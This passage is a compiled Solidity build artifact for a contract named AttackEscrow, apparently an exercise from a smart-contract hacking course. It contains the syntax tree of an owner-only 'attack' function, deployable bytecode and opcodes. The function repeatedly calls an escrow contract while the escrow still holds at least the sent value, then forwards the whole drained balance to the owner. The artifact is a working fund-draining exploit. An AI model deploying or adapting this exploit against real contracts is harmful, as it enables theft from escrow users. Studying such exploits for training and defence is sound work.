                            "typeString": "tuple()"
                          }
                        },
                        "id": 2144,
                        "nodeType": "ExpressionStatement",
                        "src": "1197:35:22"
                      },
                      {
                        "expression": {
                          "id": 2151,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 2145,
                            "name": "escrowETHBalance",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 2128,
                            "src": "1246:16:22",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "expression": {
                              "arguments": [
                                {
                                  "id": 2148,
                                  "name": "escrow",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 2080,
                                  "src": "1273:6:22",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_IEscrow_$2074",
                                    "typeString": "contract IEscrow"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_IEscrow_$2074",
                                    "typeString": "contract IEscrow"
                                  }
                                ],
                                "id": 2147,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "1265:7:22",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 2146,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "1265:7:22",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 2149,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "1265:15:22",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            },
                            "id": 2150,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberLocation": "1281:7:22",
                            "memberName": "balance",
                            "nodeType": "MemberAccess",
                            "src": "1265:23:22",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "1246:42:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 2152,
                        "nodeType": "ExpressionStatement",
                        "src": "1246:42:22"
                      }
                    ]
                  },
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 2138,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 2135,
                      "name": "escrowETHBalance",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 2128,
                      "src": "1152:16:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": ">=",
                    "rightExpression": {
                      "expression": {
                        "id": 2136,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "1172:3:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 2137,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "1176:5:22",
                      "memberName": "value",
                      "nodeType": "MemberAccess",
                      "src": "1172:9:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "1152:29:22",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 2154,
                  "nodeType": "WhileStatement",
                  "src": "1146:153:22"
                },
                {
                  "assignments": [
                    2156,
                    null
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 2156,
                      "mutability": "mutable",
                      "name": "success",
                      "nameLocation": "1315:7:22",
                      "nodeType": "VariableDeclaration",
                      "scope": 2174,
                      "src": "1310:12:22",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      },
                      "typeName": {
                        "id": 2155,
                        "name": "bool",
                        "nodeType": "ElementaryTypeName",
                        "src": "1310:4:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      "visibility": "internal"
                    },
                    null
                  ],
                  "id": 2168,
                  "initialValue": {
                    "arguments": [
                      {
                        "hexValue": "",
                        "id": 2166,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1371:2:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        },
                        "value": ""
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                          "typeString": "literal_string \"\""
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
                            "typeString": "literal_string \"\""
                          }
                        ],
                        "expression": {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "id": 2157,
                            "name": "owner",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 3056,
                            "src": "1328:5:22",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
                              "typeString": "function () view returns (address)"
                            }
                          },
                          "id": 2158,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1328:7:22",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "id": 2159,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "1336:4:22",
                        "memberName": "call",
                        "nodeType": "MemberAccess",
                        "src": "1328:12:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
                          "typeString": "function (bytes memory) payable returns (bool,bytes memory)"
                        }
                      },
                      "id": 2165,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "expression": {
                            "arguments": [
                              {
                                "id": 2162,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "1356:4:22",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_AttackEscrow_$2180",
                                  "typeString": "contract AttackEscrow"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_AttackEscrow_$2180",
                                  "typeString": "contract AttackEscrow"
                                }
                              ],
                              "id": 2161,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "1348:7:22",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 2160,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "1348:7:22",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 2163,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "nameLocations": [],
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "1348:13:22",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          },
                          "id": 2164,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "1362:7:22",
                          "memberName": "balance",
                          "nodeType": "MemberAccess",
                          "src": "1348:21:22",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "src": "1328:42:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
                        "typeString": "function (bytes memory) payable returns (bool,bytes memory)"
                      }
                    },
                    "id": 2167,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1328:46:22",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
                      "typeString": "tuple(bool,bytes memory)"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1309:65:22"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 2170,
                        "name": "success",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 2156,
                        "src": "1392:7:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "61747461636b206661696c65642c2065746820636f756c646e27742062652073656e74",
                        "id": 2171,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1401:37:22",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_ad790d264194ab95e25b383aa57f26334fa8ef5932bf03a309be6360cd69ba45",
                          "typeString": "literal_string \"attack failed, eth couldn't be sent\""
                        },
                        "value": "attack failed, eth couldn't be sent"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_ad790d264194ab95e25b383aa57f26334fa8ef5932bf03a309be6360cd69ba45",
                          "typeString": "literal_string \"attack failed, eth couldn't be sent\""
                        }
                      ],
                      "id": 2169,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "1384:7:22",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 2172,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1384:55:22",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 2173,
                  "nodeType": "ExpressionStatement",
                  "src": "1384:55:22"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 2175,
            "implemented": true,
            "kind": "function",
            "modifiers": [
              {
                "id": 2106,
                "kind": "modifierInvocation",
                "modifierName": {
                  "id": 2105,
                  "name": "onlyOwner",
                  "nameLocations": [
                    "956:9:22"
                  ],
                  "nodeType": "IdentifierPath",
                  "referencedDeclaration": 3047,
                  "src": "956:9:22"
                },
                "nodeType": "ModifierInvocation",
                "src": "956:9:22"
              }
            ],
            "name": "attack",
            "nameLocation": "930:6:22",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2104,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "936:2:22"
            },
            "returnParameters": {
              "id": 2107,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "966:0:22"
            },
            "scope": 2180,
            "src": "921:525:22",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 2178,
              "nodeType": "Block",
              "src": "1479:2:22",
              "statements": []
            },
            "id": 2179,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2176,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1459:2:22"
            },
            "returnParameters": {
              "id": 2177,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1479:0:22"
            },
            "scope": 2180,
            "src": "1452:29:22",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 2181,
        "src": "677:806:22",
        "usedErrors": []
      }
    ],
    "src": "116:1367:22"
  },
  "bytecode": "60c060405234801561001057600080fd5b5060405161064138038061064183398101604081905261002f916100bb565b6100383361004f565b6001600160a01b0391821660a052166080526100ee565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b80516001600160a01b03811681146100b657600080fd5b919050565b600080604083850312156100ce57600080fd5b6100d78361009f565b91506100e56020840161009f565b90509250929050565b60805160a05161051a610127600039600061015c01526000818160f2015281816101ea01528181610229015261028f015261051a6000f3fe6080604052600436106100435760003560e01c8063715018a61461004f5780638da5cb5b146100665780639e5faafc14610092578063f2fde38b1461009a57600080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b506100646100ba565b005b34801561007257600080fd5b50600054604080516001600160a01b039092168252519081900360200190f35b6100646100ce565b3480156100a657600080fd5b506100646100b536600461049b565b610378565b6100c26103f1565b6100cc600061044b565b565b6100d66103f1565b60405163610cd7f760e11b8152306004820152600060248201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169063c219afee9034906044016000604051808303818588803b15801561013f57600080fd5b505af1158015610153573d6000803e3d6000fd5b505050505060007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d082e3816040518163ffffffff1660e01b81526004016020604051808303816000875af11580156101ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101de91906104cb565b90506001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016315b3481106102bf5760405163104a4fc960e21b8152600481018390527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906341293f2490602401600060405180830381600087803b15801561027557600080fd5b505af1158015610289573d6000803e3d6000fd5b505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031631905061020c565b600080546040516001600160a01b039091169047908381818185875af1925050503d806000811461030c576040519150601f19603f3d011682016040523d82523d6000602084013e610311565b606091505b50509050806103735760405162461bcd60e51b815260206004820152602360248201527f61747461636b206661696c65642c2065746820636f756c646e27742062652073604482015262195b9d60ea1b60648201526084015b60405180910390fd5b505050565b6103806103f1565b6001600160a01b0381166103e55760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b606482015260840161036a565b6103ee8161044b565b50565b6000546001600160a01b031633146100cc5760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640161036a565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156104ad57600080fd5b81356001600160a01b03811681146104c457600080fd5b9392505050565b6000602082840312156104dd57600080fd5b505191905056fea26469706673582212208252a579e57f3d0fe659215785980412faad3913a8cac69397680addb405868364736f6c63430008130033",
  "bytecodeSha1": "644e96f4f5679819a6fbea953ecbf153276b1d18",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "AttackEscrow",
  "coverageMap": {
    "branches": {
      "0": {
        "Ownable._checkOwner": {
          "14": [
            1422,
            1445,
            true
          ]
        },
        "Ownable.transferOwnership": {
          "13": [
            2169,
            2191,
            true
          ]
        }
      },
      "22": {
        "AttackEscrow.attack": {
          "12": [
            1392,
            1399,
            true
          ]
        }
      },
      "5": {},
      "7": {},
      "8": {}
    },
    "statements": {
      "0": {
        "Ownable._checkOwner": {
          "9": [
            1414,
            1482
          ]
        },
        "Ownable._transferOwnership": {
          "10": [
            2541,
            2558
          ],
          "11": [
            2568,
            2613
          ]
        },
        "Ownable.owner": {
          "0": [
            1266,
            1279
          ]
        },
        "Ownable.renounceOwnership": {
          "1": [
            1895,
            1925
          ]
        },
        "Ownable.transferOwnership": {
          "6": [
            2161,
            2234
          ],
          "7": [
            2244,
            2272
          ]
        }
      },
      "22": {
        "AttackEscrow.attack": {
          "2": [
            976,
            1028
          ],
          "3": [
            1197,
            1232
          ],
          "4": [
            1246,
            1288
          ],
          "5": [
            1384,
            1439
          ]
        }
      },
      "5": {},
      "7": {
        "Context._msgSender": {
          "8": [
            712,
            729
          ]
        }
      },
      "8": {}
    }
  },
  "dependencies": [
    "OpenZeppelin/openzeppelin-contracts@4.8.0/Context",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/IERC165",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/IERC721",
    "IEscrow",
    "IEscrowNFT",
    "OpenZeppelin/openzeppelin-contracts@4.8.0/Ownable"
  ],
  "deployedBytecode": "6080604052600436106100435760003560e01c8063715018a61461004f5780638da5cb5b146100665780639e5faafc14610092578063f2fde38b1461009a57600080fd5b3661004a57005b600080fd5b34801561005b57600080fd5b506100646100ba565b005b34801561007257600080fd5b50600054604080516001600160a01b039092168252519081900360200190f35b6100646100ce565b3480156100a657600080fd5b506100646100b536600461049b565b610378565b6100c26103f1565b6100cc600061044b565b565b6100d66103f1565b60405163610cd7f760e11b8152306004820152600060248201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169063c219afee9034906044016000604051808303818588803b15801561013f57600080fd5b505af1158015610153573d6000803e3d6000fd5b505050505060007f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031663d082e3816040518163ffffffff1660e01b81526004016020604051808303816000875af11580156101ba573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101de91906104cb565b90506001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016315b3481106102bf5760405163104a4fc960e21b8152600481018390527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316906341293f2490602401600060405180830381600087803b15801561027557600080fd5b505af1158015610289573d6000803e3d6000fd5b505050507f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031631905061020c565b600080546040516001600160a01b039091169047908381818185875af1925050503d806000811461030c576040519150601f19603f3d011682016040523d82523d6000602084013e610311565b606091505b50509050806103735760405162461bcd60e51b815260206004820152602360248201527f61747461636b206661696c65642c2065746820636f756c646e27742062652073604482015262195b9d60ea1b60648201526084015b60405180910390fd5b505050565b6103806103f1565b6001600160a01b0381166103e55760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b606482015260840161036a565b6103ee8161044b565b50565b6000546001600160a01b031633146100cc5760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604482015260640161036a565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156104ad57600080fd5b81356001600160a01b03811681146104c457600080fd5b9392505050565b6000602082840312156104dd57600080fd5b505191905056fea26469706673582212208252a579e57f3d0fe659215785980412faad3913a8cac69397680addb405868364736f6c63430008130033",
  "deployedSourceMap": "677:806:22:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1831:101:0;;;;;;;;;;;;;:::i;:::-;;1201:85;;;;;;;;;;-1:-1:-1;1247:7:0;1273:6;1201:85;;;-1:-1:-1;;;;;1273:6:0;;;160:51:25;;1201:85:0;;;;;148:2:25;1201:85:0;;;921:525:22;;;:::i;2081:198:0:-;;;;;;;;;;-1:-1:-1;2081:198:0;;;;;:::i;:::-;;:::i;1831:101::-;1094:13;:11;:13::i;:::-;1895:30:::1;1922:1;1895:18;:30::i;:::-;1831:101::o:0;921:525:22:-;1094:13:0;:11;:13::i;:::-;976:52:22::1;::::0;-1:-1:-1;;;976:52:22;;1019:4:::1;976:52;::::0;::::1;695:51:25::0;1026:1:22::1;762:18:25::0;;;755:34;976:6:22::1;-1:-1:-1::0;;;;;976:16:22::1;::::0;::::1;::::0;1000:9:::1;::::0;668:18:25;;976:52:22::1;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;;1039:15;1057:3;-1:-1:-1::0;;;;;1057:16:22::1;;:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1039:36:::0;-1:-1:-1;;;;;;1120:6:22::1;1112:23;;1146:153;1172:9;1152:16;:29;1146:153;;1197:35;::::0;-1:-1:-1;;;1197:35:22;;::::1;::::0;::::1;1135:25:25::0;;;1197:6:22::1;-1:-1:-1::0;;;;;1197:26:22::1;::::0;::::1;::::0;1108:18:25;;1197:35:22::1;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;1273:6;-1:-1:-1::0;;;;;1265:23:22::1;;1246:42;;1146:153;;;1310:12;1273:6:0::0;;1328:46:22::1;::::0;-1:-1:-1;;;;;1273:6:0;;;;1348:21:22::1;::::0;1310:12;1328:46;1310:12;1328:46;1348:21;1273:6:0;1328:46:22::1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1309:65;;;1392:7;1384:55;;;::::0;-1:-1:-1;;;1384:55:22;;1583:2:25;1384:55:22::1;::::0;::::1;1565:21:25::0;1622:2;1602:18;;;1595:30;1661:34;1641:18;;;1634:62;-1:-1:-1;;;1712:18:25;;;1705:33;1755:19;;1384:55:22::1;;;;;;;;;966:480;;;921:525::o:0;2081:198:0:-;1094:13;:11;:13::i;:::-;-1:-1:-1;;;;;2169:22:0;::::1;2161:73;;;::::0;-1:-1:-1;;;2161:73:0;;1987:2:25;2161:73:0::1;::::0;::::1;1969:21:25::0;2026:2;2006:18;;;1999:30;2065:34;2045:18;;;2038:62;-1:-1:-1;;;2116:18:25;;;2109:36;2162:19;;2161:73:0::1;1785:402:25::0;2161:73:0::1;2244:28;2263:8;2244:18;:28::i;:::-;2081:198:::0;:::o;1359:130::-;1247:7;1273:6;-1:-1:-1;;;;;1273:6:0;719:10:7;1422:23:0;1414:68;;;;-1:-1:-1;;;1414:68:0;;2394:2:25;1414:68:0;;;2376:21:25;;;2413:18;;;2406:30;2472:34;2452:18;;;2445:62;2524:18;;1414:68:0;2192:356:25;2433:187:0;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:0;;;-1:-1:-1;;;;;;2541:17:0;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;222:286:25:-;281:6;334:2;322:9;313:7;309:23;305:32;302:52;;;350:1;347;340:12;302:52;376:23;;-1:-1:-1;;;;;428:31:25;;418:42;;408:70;;474:1;471;464:12;408:70;497:5;222:286;-1:-1:-1;;;222:286:25:o;800:184::-;870:6;923:2;911:9;902:7;898:23;894:32;891:52;;;939:1;936;929:12;891:52;-1:-1:-1;962:16:25;;800:184;-1:-1:-1;800:184:25:o",
  "language": "Solidity",
  "natspec": {
    "author": "JohnnyTime (https://smartcontractshacking.com)",
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "title": "AttackEscrow",
    "version": 1
  },
  "offset": [
    677,
    1483
  ],
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x715018A6 EQ PUSH2 0x4F JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x66 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x92 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x9A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x4A JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0xBA JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x72 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x64 PUSH2 0xCE JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x64 PUSH2 0xB5 CALLDATASIZE PUSH1 0x4 PUSH2 0x49B JUMP JUMPDEST PUSH2 0x378 JUMP JUMPDEST PUSH2 0xC2 PUSH2 0x3F1 JUMP JUMPDEST PUSH2 0xCC PUSH1 0x0 PUSH2 0x44B JUMP JUMPDEST JUMP JUMPDEST PUSH2 0xD6 PUSH2 0x3F1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0x610CD7F7 PUSH1 0xE1 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0xC219AFEE SWAP1 CALLVALUE SWAP1 PUSH1 0x44 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x13F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x153 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x0 PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD082E381 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1BA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1DE SWAP2 SWAP1 PUSH2 0x4CB JUMP JUMPDEST SWAP1 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND BALANCE JUMPDEST CALLVALUE DUP2 LT PUSH2 0x2BF JUMPI PUSH1 0x40 MLOAD PUSH4 0x104A4FC9 PUSH1 0xE2 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP4 SWAP1 MSTORE PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x41293F24 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x289 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH32 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND BALANCE SWAP1 POP PUSH2 0x20C JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 SELFBALANCE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 